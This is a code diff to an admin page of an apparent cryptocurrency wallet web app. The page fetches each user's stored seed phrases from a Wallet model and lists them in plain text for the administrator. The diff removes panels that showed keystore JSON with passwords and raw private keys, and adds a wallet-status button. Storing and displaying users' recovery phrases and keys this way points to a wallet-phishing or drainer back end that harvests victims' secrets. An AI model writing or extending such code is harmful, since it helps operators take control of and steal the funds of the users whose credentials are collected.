@@ -1,5 +1,7 @@
+import UserClientButton from "@/components/admin/UserClientButton";
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
-import { auth } from "@/lib/auth";
+import { auth, User as UserType } from "@/lib/auth";
+import Wallet from "@/models/wallet.model";
 import { headers } from "next/headers";
 import { notFound } from 'next/navigation';
 
@@ -9,7 +11,8 @@ async function User({ params }: Props) {
   try {
     const userId = (await params).userId;
 
-    const [userInfo] = await Promise.all([
+    const [wallet, userInfo] = await Promise.all([
+      Wallet.find({ userId: userId }),
       auth.api.getUser({
         query: { id: userId },
         headers: await headers()
@@ -24,9 +27,9 @@ async function User({ params }: Props) {
       firstName: userInfo.name.split(" ")[0],
       lastName: userInfo.name.split(" ")[1],
       email: userInfo.email,
-      phrases: [],
-      keystorejson: [],
-      privatekey: []
+      userId: userInfo.id,
+      phrases: wallet[0].phrases,
+      walletStatus: (userInfo as UserType).walletStatus
     };
 
     return (
@@ -55,7 +58,7 @@ async function User({ params }: Props) {
           <div>
             <h2 className="text-xl font-semibold mb-2">Phrases</h2>
             <div className="overflow-x-auto">
-              {user.phrases && user.phrases.length > 0 ? (
+              {user.phrases && wallet.length > 0 ? (
                 <ul className="flex flex-col gap-4 min-w-[400px] pl-3">
                   {user.phrases.map((phrase, idx) => (
                     <li key={idx} className="whitespace-nowrap">{phrase}</li>
@@ -67,54 +70,7 @@ async function User({ params }: Props) {
             </div>
           </div>
 
-          <div>
-            <h2 className="text-xl font-semibold mb-2">Keystore JSON</h2>
-            <div className="overflow-x-auto">
-              {user.keystorejson && user.keystorejson.length > 0 ? (
-                <Table className="min-w-[400px]">
-                  <TableHeader>
-                    <TableRow>
-                      <TableHead>Keystore JSON</TableHead>
-                      <TableHead>Password</TableHead>
-                    </TableRow>
-                  </TableHeader>
-                  <TableBody>
-                    {user.keystorejson.map(({ address, password }, index) => {
-                      return (
-                        <TableRow key={index}>
-                          <TableCell>
-                            <pre className="whitespace-pre-wrap break-all">{address}</pre>
-                          </TableCell>
-                          <TableCell>
-                            <span className="font-mono">{password}</span>
-                          </TableCell>
-                        </TableRow>
-                      )
-                    })}
-                  </TableBody>
-                </Table>
-              ) : (
-                <div className="text-gray-500 text-center">No data found</div>
-              )}
-            </div>
-          </div>
-
-          <div>
-            <h2 className="text-xl font-semibold mb-2">Private Key</h2>
-            <div className="overflow-x-auto">
-              {user.privatekey && user.privatekey?.length > 0 ? (
-                <div className="flex flex-col gap-4 min-w-[400px] pl-3">
-                  {user.privatekey.map((key, idx) => (
-                    <div key={idx} className="whitespace-nowrap">
-                      {key}
-                    </div>
-                  ))}
-                </div>
-              ) : (
-                <div className="text-gray-500 text-center">No data found</div>
-              )}
-            </div>
-          </div>
+          <UserClientButton walletStatus={user.walletStatus} userId={user.userId} />
         </div>
       </section>
     )
